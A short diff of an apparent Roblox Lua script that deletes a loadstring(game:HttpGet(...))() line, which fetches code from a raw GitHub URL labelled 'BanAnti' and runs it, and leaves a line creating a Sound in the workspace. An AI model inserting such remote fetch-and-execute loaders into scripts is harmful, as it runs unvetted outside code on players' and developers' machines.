@@ -1,5 +1,4 @@
 -- helllo
-loadstring(game:HttpGet("https://raw.githubusercontent.com/scripture2025/Checker/refs/heads/main/BanAnti"))()
 
 local s = Instance.new("Sound", workspace)
 s.SoundId = "rbxassetid://137887059021698"
